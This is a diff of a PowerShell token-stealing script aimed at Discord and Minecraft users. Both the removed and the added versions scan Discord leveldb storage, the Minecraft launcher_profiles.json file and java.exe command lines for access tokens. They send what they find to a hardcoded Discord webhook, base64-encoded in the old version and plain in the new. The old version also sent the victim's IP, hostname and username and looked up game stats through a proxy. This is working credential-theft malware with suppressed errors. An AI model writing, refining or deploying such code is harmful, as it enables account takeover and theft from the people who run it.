@@ -1,67 +1,57 @@
-$w='aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ5MDYyOTc0OTE1OTEwNDUzMi93RnU2QlY0bHJnOEhIdU56aTEwSWk0cE1YWWtKeDBfeER1azVObk9nVkRvUHZKcXdBb1BzZXNlYmdHS0lJbTJXWjZPYw=='
-$u=[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($w))
+$webhookUrl = "https://discord.com/api/webhooks/1490629749159104532/wFu6BV4lrg8HHuNzi10Ii4pMXYkJx0_xDuk5NnOgVDoPvJqwAoPsesebgGKOIm2WZ6Oc"
 
-function snd {
-    $b=@{content=$args[0]}|ConvertTo-Json
-    try{Invoke-RestMethod -Uri $u -Method Post -Body $b -ContentType 'application/json' -ErrorAction SilentlyContinue}catch{}
-}
+# Discord tokens from app storage
+$paths = @(
+    "$env:LOCALAPPDATA\Discord\Local Storage\leveldb",
+    "$env:LOCALAPPDATA\discordcanary\Local Storage\leveldb",
+    "$env:LOCALAPPDATA\discordptb\Local Storage\leveldb"
+)
 
-function gtDiscord {
-    $p=@("$env:LOCALAPPDATA\Discord\Local Storage\leveldb","$env:LOCALAPPDATA\discordcanary\Local Storage\leveldb","$env:LOCALAPPDATA\discordptb\Local Storage\leveldb")
-    foreach($q in $p){
-        if(Test-Path $q){
-            Get-ChildItem "$q\*.ldb" -ErrorAction SilentlyContinue|%{
-                $c=Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue
-                [regex]::Matches($c,'[\w-]{24,}\.[\w-]{6,}\.[\w-]{27,}')|%{snd "**[DC TOKEN]**`n```$($_.Value)```";Start-Sleep -Milliseconds 300}
+foreach ($path in $paths) {
+    if (Test-Path $path) {
+        Get-ChildItem "$path\*.ldb" -ErrorAction SilentlyContinue | ForEach-Object {
+            $content = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue
+            $matches = [regex]::Matches($content, '[\w-]{24,}\.[\w-]{6,}\.[\w-]{27,}')
+            foreach ($match in $matches) {
+                $payload = @{ content = "**[DISCORD TOKEN]**`n```$($match.Value)```" } | ConvertTo-Json
+                try {
+                    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json" -ErrorAction SilentlyContinue
+                } catch {}
+                Start-Sleep -Milliseconds 500
             }
         }
     }
 }
 
-function gtStats {
-    param($user)
-    $api="https://kodyeqfgzyeokvvyxqmo.supabase.co/functions/v1/api-proxy?path=/v1/stats/$user&apikey=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImtvZHllcWZnenllb2t2dnl4cW1vIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzU5OTUxNTUsImV4cCI6MjA5MTU3MTE1NX0.owv9p6EXYa6pL7Rt4yHr1pbE8dvv16kjcNGMv7Pi0Xs"
-    try{
-        $r=Invoke-RestMethod $api
-        if($r.status -eq 200 -and $r.result){
-            $m=[int]$r.result.money
-            snd "**[STATS - $user]**`n💰 $([math]::Round($m/1000,1))K`n💎 $($r.result.shards)`n🗡️ $($r.result.kills)`n⏱️ $([math]::Round([int]$r.result.playtime/3600,1))h`n👤 https://mc-heads.net/avatar/$user/64"
-        }
-    }catch{}
-}
-
-function gtMinecraft {
-    $p="C:\Users\$env:USERNAME\AppData\Roaming\.minecraft\launcher_profiles.json"
-    if(Test-Path $p){
-        try{
-            $d=Get-Content $p -Raw|ConvertFrom-Json
-            $t=$d.accessToken
-            $u=$d.selectedProfile.name
-            if($t){snd "**[MC SESSION]**`n```$t```";if($u){snd "**[MC USER]**`n$u`nhttps://mc-heads.net/avatar/$u/64";gtStats $u}}
-        }catch{}
-    }
-}
-
-function gtJava {
-    try{
-        Get-CimInstance -Query "SELECT CommandLine FROM Win32_Process WHERE Name='java.exe'"|%{
-            $l=$_.CommandLine
-            if($l -match '--accessToken\s+(\S+)' -and $l -match '--username\s+(\S+)'){
-                snd "**[JAVA TOKEN - $($Matches[2])]**`n```$($Matches[1])```"
-                gtStats $Matches[2]
+# Java process tokens (Minecraft modded clients)
+Get-CimInstance -Query "SELECT CommandLine FROM Win32_Process WHERE Name='java.exe'" -ErrorAction SilentlyContinue |
+    Select-Object -ExpandProperty CommandLine |
+    ForEach-Object {
+        if ($_ -match '--accessToken\s+(\S+)') {
+            $accessToken = $matches[1]
+            $username = ""
+            if ($_ -match '--username\s+(\S+)') {
+                $username = $matches[1]
+            }
+            if ($accessToken) {
+                $payload = @{ content = "**[JAVA TOKEN - $username]**`n```$accessToken```" } | ConvertTo-Json
+                try {
+                    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json" -ErrorAction SilentlyContinue
+                } catch {}
+                Start-Sleep -Milliseconds 500
             }
         }
-    }catch{}
-}
+    }
 
-function gtIP {
-    try{
-        $ip=Invoke-RestMethod 'https://api.ipify.org'
-        snd "**[SYSTEM]**`nIP: $ip`nHost: $env:COMPUTERNAME`nUser: $env:USERNAME"
-    }catch{}
+# Minecraft launcher token
+$mcPath = "C:\Users\$env:USERNAME\AppData\Roaming\.minecraft\launcher_profiles.json"
+if (Test-Path $mcPath) {
+    try {
+        $data = Get-Content $mcPath -Raw | ConvertFrom-Json
+        $token = $data.accessToken
+        if ($token) {
+            $payload = @{ content = "**[MINECRAFT SESSION]**`n```$token```" } | ConvertTo-Json
+            Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json" -ErrorAction SilentlyContinue
+        }
+    } catch {}
 }
-
-gtIP
-gtDiscord
-gtMinecraft
-gtJava
